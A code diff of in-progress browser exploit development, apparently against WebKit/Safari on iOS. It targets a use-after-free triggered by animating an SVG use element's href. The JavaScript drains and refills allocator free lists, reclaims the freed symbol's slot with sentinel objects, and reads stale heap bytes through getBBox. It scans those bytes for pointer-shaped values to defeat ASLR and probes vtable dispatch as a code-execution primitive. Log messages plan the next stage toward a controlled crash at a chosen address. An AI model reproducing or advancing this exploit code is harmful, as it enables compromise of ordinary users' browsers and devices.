-async function runG5(q=false){
-    if(!q){dis(true);sep();log('▶ G5: sentinel decode + layout mapping','inf');sep();}
-    log('[*] running G4 pattern (most reliable) with varied sentinel values','inf');
-    log('[*] each trial varies the spray geometry → maps which field getBBox reads','inf');
-    // Try different geometry in the spray to identify the exact field offset
-    const tests=[
-        {x:11111,y:22222,w:33333,h:44444,label:'x=11111 y=22222 w=33333 h=44444'},
-        {x:55555,y:66666,w:77777,h:88888,label:'x=55555 y=66666 w=77777 h=88888'},
-        {x:12345,y:67890,w:11111,h:99999,label:'x=12345 y=67890 w=11111 h=99999'},
-        {x:99999,y:11111,w:22222,h:33333,label:'x=99999 y=11111 w=22222 h=33333'},
-    ];
-    for(const[ti,geo] of tests.entries()){
-        log(`\n[*] trial ${ti}: ${geo.label}`,'inf');
+    // DRAIN SIZES: drain with different SVGSymbol counts to exhaust the free list
+    for(const drainN of [512, 1024, 2048]){
+        log(`[*] draining with ${drainN} SVGSymbol objects first`,'inf');
         for(let t=0;t<4;t++){
-            const svg=mkSVGContainer();const svgSpray=mkSVGContainer();
-            let sym1=mkSymbol(`g5_${ti}_s1_${t}`,4);
-            let sym2=mkSymbol(`g5_${ti}_s2_${t}`,4);
+            const {svg,useEl,sym1,sym2}=await setupUAF(`fd_${drainN}_${t}`);
+            const svgDrain=mkSVGContainer();
+
+            // DRAIN: alloc drainN symbols → fills + empties free list
+            const drain=[];
+            for(let i=0;i<drainN;i++){
+                const s=document.createElementNS(SVG_NS,'symbol');
+                s.setAttribute('id',`fd_dr_${drainN}_${t}_${i}`);
+                s.setAttribute('viewBox','0 0 10 10');
+                svgDrain.appendChild(s);drain.push(s);
+            }
+            // Free them all → drainN free slots in sym1's size class
+            for(const d of drain){d.remove();}drain.length=0;
+            // Re-alloc drainN symbols → fills all drainN free slots
+            for(let i=0;i<drainN;i++){
+                const s=document.createElementNS(SVG_NS,'symbol');
+                s.setAttribute('id',`fd_refill_${drainN}_${t}_${i}`);
+                s.setAttribute('viewBox','0 0 10 10');
+                svgDrain.appendChild(s);drain.push(s);
+            }
+            // Free list is now EMPTY for sym1's size class
+            // FREE SYM1 → HEAD of empty free list = sym1's slot
+            sym1.remove();
+            // IMMEDIATELY allocate ONE sentinel symbol (NO yield, NO GC between)
+            // This MUST get sym1's slot (LIFO: head of free list)
+            const sentinel=document.createElementNS(SVG_NS,'symbol');
+            sentinel.setAttribute('id',`fd_sent_${drainN}_${t}`);
+            sentinel.setAttribute('viewBox','0 0 100 100');
+            // Give sentinel a single rect with COMPLETELY different geometry
+            const sr=document.createElementNS(SVG_NS,'rect');
+            sr.setAttribute('x','50');sr.setAttribute('y','60');
+            sr.setAttribute('width','70');sr.setAttribute('height','80');
+            sentinel.appendChild(sr);
+            svgDrain.appendChild(sentinel);
+            // No yield here — sentinel allocation is synchronous with sym1 free
+
+            await gcLight(3);await yield_();
+            const bb=await getBBoxUAF(useEl);
+            const w=bb?bb.width:0,h=bb?bb.height:0;
+            const baseline=(Math.abs(w-KNOWN_W)<0.001&&Math.abs(h-KNOWN_H)<0.001);
+            const changed=(w!==0||h!==0)&&!baseline;
+            if(changed){
+                log(`  [SLOT CAPTURED!] drain=${drainN} t${t}: w=${w.toFixed(6)}(${f2h(w)}) h=${h.toFixed(6)}(${f2h(h)})`,'ok');
+                log(`    diff from baseline: Δw=${(w-KNOWN_W).toFixed(6)} Δh=${(h-KNOWN_H).toFixed(6)}`,'ok');
+            }else if(w!==0||h!==0){
+                log(`  [BASELINE] drain=${drainN} t${t}: w=${w.toFixed(6)} h=${h.toFixed(6)} (still reading sym1 stale bytes)`,'dim');
+            }else{
+                log(`  [ZERO] drain=${drainN} t${t}: 0.0 — anim lost ptr or no UAF`,'bad');
+            }
+            for(const d of drain)d.remove();drain.length=0;
+            sentinel.remove();sym2.remove();svg.remove();svgDrain.remove();await yield_();
+        }
+    }
+    if(!q)dis(false);
+}
+
+// ── R1: single-alloc replace with ZERO-child sentinel ─────────────────
+// Zero-child sentinel → no geometry → render size = 0,0
+// If we capture sym1's slot AND getBBox reads from sentinel's render:
+//   result = 0,0 (no geometry)
+// If getBBox reads from sym1's CACHED bytes (not re-rendered from sentinel):
+//   result = 0x3f400000 / 0x3e19999a (sym1's inline cached layout data)
+// This test disambiguates HOW WebKit reads the stale ptr
+async function runR1(q=false){
+    if(!q){dis(true);sep();log('▶ R1: zero-child sentinel → test render vs cache read','inf');sep();}
+    log('[*] zero-child sentinel: if slot captured + reads render → returns 0,0','inf');
+    log('[*] zero-child sentinel: if reads inline cached bytes in freed chunk → baseline values','inf');
+    let captured=0,renderRead=0,cacheRead=0;
+    for(let t=0;t<16;t++){
+        const {svg,useEl,sym1,sym2}=await setupUAF(`r1_${t}`);
+        const svgD=mkSVGContainer();
+        // drain 1024 then refill 1024
+        const drain=[];
+        for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r1d_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+        for(const d of drain)d.remove();drain.length=0;
+        for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r1r_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+        // FREE SYM1 + IMMEDIATELY alloc zero-child sentinel
+        sym1.remove();
+        const sentinel=document.createElementNS(SVG_NS,'symbol');
+        sentinel.setAttribute('id',`r1s_${t}`);
+        sentinel.setAttribute('viewBox','0 0 100 100');
+        // ZERO children
+        svgD.appendChild(sentinel);
+        await gcLight(3);await yield_();
+        const bb=await getBBoxUAF(useEl);
+        const w=bb?bb.width:0,h=bb?bb.height:0;
+        if(w===0&&h===0&&bb!==null){
+            // ZERO result: either (a) no UAF at all, or (b) slot captured + render reads 0-child sentinel
+            log(`  t${t}: 0,0 — possibly slot captured + zero-child sentinel read`,'inf');
+            cacheRead++; // ambiguous but count
+        }else if(w!==0||h!==0){
+            const baseline=(Math.abs(w-KNOWN_W)<0.001&&Math.abs(h-KNOWN_H)<0.001);
+            if(baseline){
+                log(`  t${t}: BASELINE (sym1 stale): w=${w.toFixed(6)} h=${h.toFixed(6)}`,'dim');
+                cacheRead++;
+            }else{
+                log(`  [CAPTURED!!] t${t}: w=${w.toFixed(6)}(${f2h(w)}) h=${h.toFixed(6)}(${f2h(h)}) — DIFFERENT from sym1 baseline!`,'ok');
+                renderRead++;captured++;
+            }
+        }
+        for(const d of drain)d.remove();drain.length=0;sentinel.remove();sym2.remove();svg.remove();svgD.remove();await yield_();
+    }
+    log(`\n[*] R1 summary: captured=${captured} renderRead=${renderRead} cacheRead=${cacheRead}`,(captured>0?'ok':'inf'));
+    if(!q)dis(false);return captured;
+}
+
+// ── R2: controlled geometry sentinel ──────────────────────────────────
+// Use a sentinel symbol with LARGE distinguishable rect geometry
+// Multiple rect configs to maximize difference from sym1 baseline
+async function runR2(q=false){
+    if(!q){dis(true);sep();log('▶ R2: controlled geometry sentinel → read our bytes','inf');sep();}
+    const configs=[
+        {x:80,y:80,w:90,h:90,label:'x=80 y=80 w=90 h=90'},
+        {x:0,y:0,w:100,h:100,label:'x=0 y=0 w=100 h=100'},
+        {x:50,y:0,w:50,h:100,label:'x=50 y=0 w=50 h=100'},
+    ];
+    let captured=0;
+    for(const cfg of configs){
+        log(`[*] sentinel geometry: ${cfg.label}`,'inf');
+        for(let t=0;t<8;t++){
+            const {svg,useEl,sym1,sym2}=await setupUAF(`r2_${cfg.x}_${t}`);
+            const svgD=mkSVGContainer();
+            const drain=[];
+            for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r2d_${cfg.x}_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+            for(const d of drain)d.remove();drain.length=0;
+            for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r2r_${cfg.x}_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+            sym1.remove();
+            const sentinel=mkSymbolCustom(`r2s_${cfg.x}_${t}`,[{x:cfg.x,y:cfg.y,w:cfg.w,h:cfg.h}]);
+            svgD.appendChild(sentinel);
+            await gcLight(3);await yield_();
+            const bb=await getBBoxUAF(useEl);
+            const w=bb?bb.width:0,h=bb?bb.height:0;
+            const baseline=(Math.abs(w-KNOWN_W)<0.001&&Math.abs(h-KNOWN_H)<0.001);
+            if((w!==0||h!==0)&&!baseline){
+                log(`  [CAPTURED!] ${cfg.label} t${t}: w=${w.toFixed(6)}(${f2h(w)}) h=${h.toFixed(6)}(${f2h(h)})`,'ok');
+                captured++;
+            }else if(w!==0||h!==0){
+                log(`  t${t}: baseline (sym1 stale): w=${w.toFixed(6)}`,'dim');
+            }else log(`  t${t}: 0.0`,'dim');
+            for(const d of drain)d.remove();drain.length=0;
+            sentinel.remove();sym2.remove();svg.remove();svgD.remove();await yield_();
+        }
+    }
+    log(`[${captured>0?'+':'-'}] R2: ${captured} slot captures with geometry sentinel`,(captured>0?'ok':'bad'));
+    if(!q)dis(false);return captured;
+}
+
+// ── R3: ptr-shaped bytes spray ────────────────────────────────────────
+// GOAL: read pointer values from freed sym1 slot (not inject fake ones)
+// The stale bytes at 0x3f400000/0x3e19999a ARE sym1's raw layout data.
+// What if we just read MORE BYTES from that allocation?
+// getBBox only gives us w,h — 8 bytes. But sym1's allocation is ~352 bytes.
+// We can read DIFFERENT OFFSETS by varying the useEl geometry/coordinate frame.
+// Try: nested use elements, transform matrices, different SVG viewBox scaling
+// → each changes WHICH 8 bytes getBBox returns from the freed allocation
+async function runR3(q=false){
+    if(!q){dis(true);sep();log('▶ R3: multi-offset read — scan more of freed sym1 allocation','inf');sep();}
+    log('[*] varying coordinate frame to read different offsets in freed sym1 chunk','inf');
+    log('[*] goal: find a ptr-shaped value (0x01xxxxxxxx range) in the allocation','inf');
+    const transforms=[
+        {vw:200,vh:200,scale:1,label:'200×200 (baseline)'},
+        {vw:100,vh:100,scale:2,label:'100×100 2×scale'},
+        {vw:50,vh:50,scale:4,label:'50×50 4×scale'},
+        {vw:400,vh:400,scale:0.5,label:'400×400 0.5×scale'},
+        {vw:10,vh:10,scale:20,label:'10×10 20×scale'},
+        {vw:1,vh:1,scale:200,label:'1×1 200×scale'},
+    ];
+    const ptrLike=[];
+    for(const tf of transforms){
+        log(`  viewBox: ${tf.label}`,'inf');
+        for(let t=0;t<4;t++){
+            const svg=document.createElementNS(SVG_NS,'svg');
+            svg.setAttribute('width','200');svg.setAttribute('height','200');
+            svg.setAttribute('viewBox',`0 0 ${tf.vw} ${tf.vh}`);
+            svg.style.cssText='position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01';
+            document.body.appendChild(svg);
+            let sym1=mkSymbol(`r3_${tf.vw}_${t}_s1`,0,10,15,15,4);
+            let sym2=mkSymbol(`r3_${tf.vw}_${t}_s2`,0,10,15,15,4);
             svg.appendChild(sym1);svg.appendChild(sym2);
             const useEl=document.createElementNS(SVG_NS,'use');
-            useEl.setAttribute('href',`#g5_${ti}_s1_${t}`);
+            useEl.setAttribute('href',`#r3_${tf.vw}_${t}_s1`);
             const anim=document.createElementNS(SVG_NS,'animate');
             anim.setAttribute('attributeName','href');
-            anim.setAttribute('values',`#g5_${ti}_s1_${t};#g5_${ti}_s2_${t}`);
+            anim.setAttribute('values',`#r3_${tf.vw}_${t}_s1;#r3_${tf.vw}_${t}_s2`);
             anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
             useEl.appendChild(anim);svg.appendChild(useEl);
-            await sleep(30);
-            const decoys=[];
-            for(let i=0;i<512;i++){const s=mkSymbol(`g5_dec_${ti}_${t}_${i}`,4);svgSpray.appendChild(s);decoys.push(s);}
-            for(const d of decoys)d.remove();decoys.length=0;
+            await sleep(35);
             sym1.remove();sym1=null;
-            const spray=[];
-            for(let i=0;i<512;i++){
-                const s=document.createElementNS(SVG_NS,'symbol');
-                s.setAttribute('id',`g5_sp_${ti}_${t}_${i}`);
-                s.setAttribute('viewBox','0 0 100 100');
-                const r=document.createElementNS(SVG_NS,'rect');
-                r.setAttribute('x',String(geo.x));r.setAttribute('y',String(geo.y));
-                r.setAttribute('width',String(geo.w));r.setAttribute('height',String(geo.h));
-                s.appendChild(r);svgSpray.appendChild(s);spray.push(s);
-            }
-            await gcLight(2);await yield_();
-            let w=0,h=0;
-            try{
-                for(let i=0;i<10;i++){
-                    const bb=useEl.getBBox();
-                    if(bb.width!==0||bb.height!==0){w=bb.width;h=bb.height;break;}
-                    await yield_();
-                }
-            }catch(e){}
-            const hit=(w!==0||h!==0);
-            if(hit){
-                // which geo value matches?
-                const vals={x:geo.x,y:geo.y,w:geo.w,h:geo.h};
-                const matches=Object.entries(vals).filter(([k,v])=>Math.abs(w-v)<100||Math.abs(h-v)<100);
-                if(matches.length>0){
-                    log(`  [FIELD MAP] t${t}: getBBox w=${w.toFixed(0)} h=${h.toFixed(0)} matches spray field: ${matches.map(([k])=>k).join(',')}`,'ok');
+            await gcLight(8);await yield_();
+            const bb=await getBBoxUAF(useEl);
+            const w=bb?bb.width:0,h=bb?bb.height:0;
+            if(w!==0||h!==0){
+                const wU=f2u(w);const hU=f2u(h);
+                const wHi=wU>>>24;const hHi=hU>>>24;
+                // ptr-like: high byte = 0x00, 0x01, 0x02 (user-space arm64)
+                const wPtr=(wHi<=0x02);const hPtr=(hHi<=0x02);
+                if(wPtr||hPtr){
+                    log(`    [PTR!] ${tf.label} t${t}: w=${f2h(w)} h=${f2h(h)} → ptr=0x${hU.toString(16).padStart(8,'0')}${wU.toString(16).padStart(8,'0')}`,'ok');
+                    ptrLike.push({tf,t,w,h,wU,hU});
                 }else{
-                    log(`  [UAF raw] t${t}: w=${f2h(w)} h=${f2h(h)}`,'hi');
+                    log(`    t${t}: w=${f2h(w)} h=${f2h(h)}`,'dim');
                 }
-            }else log(`  t${t}: 0.0`,'dim');
-            for(const s of spray)s.remove();spray.length=0;
-            sym2.remove();svg.remove();svgSpray.remove();await yield_();
+            }else log(`    t${t}: 0.0`,'dim');
+            sym2.remove();svg.remove();await yield_();
         }
+    }
+    log(`\n[*] ptr-shaped reads: ${ptrLike.length}`,(ptrLike.length>0?'ok':'inf'));
+    if(ptrLike.length>0){
+        log('[+] POTENTIAL ADDRESS LEAK — ptr-like values found in freed allocation','ok');
+        for(const p of ptrLike){
+            log(`  ${p.tf.label} t${p.t}: 0x${p.hU.toString(16).padStart(8,'0')}${p.wU.toString(16).padStart(8,'0')}`,'hi');
+        }
+    }
+    if(!q)dis(false);return ptrLike.length;
+}
+
+// ── R4: vtable smash — if we capture slot, what does renderer() call? ─
+// After confirmed slot capture (G4 drain working), try to influence vtable read
+// Plant a sentinel symbol THEN call methods that trigger virtual dispatch
+// A CRASH at a non-zero address = controlled vtable deref = code exec primitive
+async function runR4(q=false){
+    if(!q){dis(true);sep();log('▶ R4: vtable read probe — what does WebKit deref at sym1 offset 0?','inf');sep();}
+    log('[*] draining free list then freeing sym1 + planting sentinel','inf');
+    log('[*] then calling methods that trigger virtual dispatch on stale ptr','inf');
+    log('[*] any crash with non-null addr = controlled vtable read','inf');
+    for(let t=0;t<8;t++){
+        const {svg,useEl,sym1,sym2}=await setupUAF(`r4_${t}`);
+        const svgD=mkSVGContainer();
+        const drain=[];
+        for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r4d_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+        for(const d of drain)d.remove();drain.length=0;
+        for(let i=0;i<1024;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`r4r_${t}_${i}`);svgD.appendChild(s);drain.push(s);}
+        sym1.remove();
+        // Place sentinel with rect at unusual coordinates
+        const sentinel=mkSymbolCustom(`r4s_${t}`,[{x:75,y:15,w:25,h:85}]);
+        svgD.appendChild(sentinel);
+        await gcLight(3);await yield_();
+        let crashed=false,result=null;
+        try{
+            // getBBox — virtual dispatch through stale ptr
+            const bb=useEl.getBBox();
+            result={w:bb.width,h:bb.height};
+        }catch(e){
+            crashed=true;
+            log(`  [CRASH] t${t}: ${e}`,'hi');
+        }
+        if(!crashed&&result){
+            const {w,h}=result;
+            const baseline=(Math.abs(w-KNOWN_W)<0.001&&Math.abs(h-KNOWN_H)<0.001);
+            if(!baseline&&(w!==0||h!==0)){
+                log(`  [CAPTURED] t${t}: w=${w.toFixed(6)} h=${h.toFixed(6)} — sentinel geometry read!`,'ok');
+            }else if(w!==0||h!==0){
+                log(`  t${t}: baseline stale: w=${w.toFixed(6)}`,'dim');
+            }else log(`  t${t}: 0.0`,'dim');
+        }
+        for(const d of drain)d.remove();drain.length=0;
+        sentinel.remove();sym2.remove();svg.remove();svgD.remove();await yield_();
+        if(crashed)break;
     }
     if(!q)dis(false);
 }
 
 // ── CRASH ─────────────────────────────────────────────────────────────
 async function runCRASH(){
-    sep();log('▶ CRASH: max same-type spray + vtable smash attempt','bad');sep();
-    const svg=mkSVGContainer();const svgSpray=mkSVGContainer();
-    let sym1=mkSymbol('crash_s1',4);
-    let sym2=mkSymbol('crash_s2',4);
-    svg.appendChild(sym1);svg.appendChild(sym2);
-    const useEl=document.createElementNS(SVG_NS,'use');useEl.setAttribute('href','#crash_s1');
-    const anim=document.createElementNS(SVG_NS,'animate');
-    anim.setAttribute('attributeName','href');
-    anim.setAttribute('values','#crash_s1;#crash_s2');
-    anim.setAttribute('dur','0.05s');anim.setAttribute('repeatCount','indefinite');
-    useEl.appendChild(anim);svg.appendChild(useEl);
-    await sleep(50);
-    // MASSIVE spray: 2048 decoys then 2048 sentinels
-    const decoys=[];
-    for(let i=0;i<2048;i++){const s=mkSymbol(`crash_dec_${i}`,4);svgSpray.appendChild(s);decoys.push(s);}
-    for(const d of decoys)d.remove();decoys.length=0;
-    sym1.remove();sym1=null;
-    log('[*] sym1 freed — spraying 2048 controlled symbols','dim');
-    const spray=[];
-    for(let i=0;i<2048;i++){
-        const s=document.createElementNS(SVG_NS,'symbol');
-        s.setAttribute('id',`crash_sp_${i}`);s.setAttribute('viewBox','0 0 1 1');
-        const r=document.createElementNS(SVG_NS,'rect');
-        // use NaN-adjacent values that would crash if used as ptr
-        r.setAttribute('x','33333');r.setAttribute('y','44444');
-        r.setAttribute('width','55555');r.setAttribute('height','66666');
-        s.appendChild(r);svgSpray.appendChild(s);spray.push(s);
-    }
-    await gcLight(5);
-    log('[*] forcing getBBox × 50','dim');
-    for(let i=0;i<50;i++){
+    sep();log('▶ CRASH: drain 4096 + immediate sentinel + force virtual dispatch','bad');sep();
+    const {svg,useEl,sym1,sym2}=await setupUAF('crash');
+    const svgD=mkSVGContainer();
+    // mega drain: 4096 symbols
+    log('[*] allocating 4096 drain symbols','dim');
+    const drain=[];
+    for(let i=0;i<4096;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`cr_d_${i}`);svgD.appendChild(s);drain.push(s);}
+    log('[*] freeing all drain symbols','dim');
+    for(const d of drain)d.remove();drain.length=0;
+    log('[*] re-allocating 4096 to drain free list','dim');
+    for(let i=0;i<4096;i++){const s=document.createElementNS(SVG_NS,'symbol');s.setAttribute('id',`cr_r_${i}`);svgD.appendChild(s);drain.push(s);}
+    log('[*] free list now EMPTY — freeing sym1 → HEAD of free list','dim');
+    sym1.remove();
+    log('[*] IMMEDIATELY placing sentinel (zero children)','dim');
+    const sentinel=document.createElementNS(SVG_NS,'symbol');
+    sentinel.setAttribute('id','cr_sent');
+    sentinel.setAttribute('viewBox','0 0 100 100');
+    svgD.appendChild(sentinel);
+    log('[*] forcing 100 getBBox iterations on stale ptr','dim');
+    let hitCount=0;
+    for(let i=0;i<100;i++){
         try{
             const bb=useEl.getBBox();
             const w=bb.width,h=bb.height;
-            if(w!==0||h!==0){
-                log(`[+] i=${i}: w=${w.toFixed(0)} h=${h.toFixed(0)} w_hex=${f2h(w)} h_hex=${f2h(h)}`,'ok');
-                if(Math.abs(w-33333)<100||Math.abs(w-55555)<100||Math.abs(h-44444)<100||Math.abs(h-66666)<100){
-                    log('[+] SENTINEL MATCH — spray landed in freed sym1 slot!','ok');
-                    log(`[+] getBBox is reading our spray symbol's geometry`,'ok');
-                    log(`[+] CONTROLLED UAF READ CONFIRMED`,'ok');
-                }
+            const baseline=(Math.abs(w-KNOWN_W)<0.001&&Math.abs(h-KNOWN_H)<0.001);
+            if(w===0&&h===0){
+                log(`  [ZERO] i=${i}: 0,0 — possible slot capture with zero-child sentinel`,'hi');
+                hitCount++;
+            }else if(!baseline){
+                log(`  [CAPTURED] i=${i}: w=${f2h(w)} h=${f2h(h)} — SENTINEL DATA READ`,'ok');
+                hitCount++;
+            }else{
+                if(i<5||i%25===0)log(`  i=${i}: baseline ${f2h(w)} / ${f2h(h)}`,'dim');
             }
         }catch(e){
-            log(`[CRASH] i=${i}: ${e}`,'hi');
-            log('[+] CRASH = WebKit touched freed sym1 memory with our data','ok');
-            break;
+            log(`  [CRASH] i=${i}: ${e}`,'hi');
+            log('[+] CRASH = vtable deref on sentinel — CONTROLLED CRASH','ok');
+            hitCount++;break;
         }
         await yield_();
     }
-    for(const s of spray)s.remove();spray.length=0;
-    svg.remove();svgSpray.remove();
+    log(`[*] total notable events: ${hitCount}`,(hitCount>0?'ok':'bad'));
+    for(const d of drain)d.remove();drain.length=0;
+    sentinel.remove();sym2.remove();svg.remove();svgD.remove();
     dis(false);
 }
 
 // ── RUN ALL ───────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v4 — fixed heap grooming → controlled read','inf');sep();
-    log('[*] v3 fix: 2-symbol animation, same-type spray, correct timing','inf');log('');
+    log('▶ SVG animate UAF v5 — LIFO-aware heap grooming → controlled read','inf');sep();
+    log(`[*] v4 confirmed: UAF reads sym1's own stale bytes at offset (0x3f400000/0x3e19999a)`,'ok');
+    log('[*] v5 goal: drain free list → capture slot → read OUR bytes','inf');log('');
     const R={};
-    R.V=await runV(true);log('');
-    if(R.V===0){
-        log('[!] V re-confirm FAILED — animation UAF not reproducing','bad');
-        log('[!] possible: page reload, Safari restarted, iOS updated','bad');
-        log('[!] skipping spray tests — re-run V alone to debug','bad');
-        dis(false);return;
-    }
     for(const[lbl,fn] of [
-        ['G1_text_spray',runG1],
-        ['G2_svg_element',runG2],
-        ['G3_attribute_spray',runG3],
-        ['G4_interleave_same_type',runG4],
-        ['G5_sentinel_decode',runG5],
+        ['FD_drain_probe',runFD],
+        ['R1_zero_sentinel',runR1],
+        ['R2_geometry_sentinel',runR2],
+        ['R3_ptr_scan',runR3],
+        ['R4_vtable_probe',runR4],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
-        try{const r=await fn(true);R[lbl]=r;}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
+        try{const r=await fn(true);R[lbl]=r;}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=0;}
         log('');
     }
-    sep();log('▶ SUMMARY v4','inf');sep();
-    log(`  V_confirm: ${R.V}/8 UAF hits`,(R.V>0?'ok':'bad'));
+    sep();log('▶ SUMMARY v5','inf');sep();
+    log(`[*] baseline UAF bytes: ${f2h(KNOWN_W)} / ${f2h(KNOWN_H)}`,'inf');
     for(const[lbl,r] of Object.entries(R)){
-        if(lbl==='V')continue;
-        const hit=(r>0)||(r===undefined);
-        log(`  ${hit?'[+]':'[-]'} ${lbl}`,hit?'ok':'bad');
+        const hit=r>0;
+        log(`  ${hit?'[+]':'[-]'} ${lbl}: ${r??'—'}`,hit?'ok':'bad');
     }
     log('');
-    const anySpray=Object.entries(R).some(([k,v])=>k!=='V'&&v>0);
-    if(anySpray){
-        log('[+] CONTROLLED UAF READ ACHIEVED','ok');
-        log('[+] spray is landing in freed sym1 slot','ok');
-        log('[+] next: svg_v5 — decode ptr values from read data → ASLR defeat','ok');
+    const anyCapture=Object.entries(R).some(([k,v])=>v>0);
+    if(anyCapture){
+        log('[+] FREE LIST DRAIN WORKING — slot captured','ok');
+        log('[+] we control bytes at freed sym1 address','ok');
+        log('[+] next: svg_v6 — spray vtable-shaped bytes → controlled vtable read → crash at chosen addr','ok');
     }else{
-        log('[-] spray not yet landing in freed slot','bad');
-        log('[*] check V count: if V>0 but G all 0, UAF reads null-initialized memory','inf');
-        log('[*] means bmalloc zeroes freed chunks before reuse — need different approach','inf');
-        log('[*] key question: does V hit 8/8 or intermittent?','inf');
+        log('[-] slot capture not yet working','bad');
+        log('[*] check FD: if "[SLOT CAPTURED!]" appears → drain count found, R tests need tuning','inf');
+        log('[*] check R3: ptr-shaped values → even without spray, stale sym1 bytes MAY contain ptrs','inf');
+        log('[*] key: does R3 find any 0x0000000X________ shaped values? paste R3 output','inf');
     }
     sep();dis(false);
 }
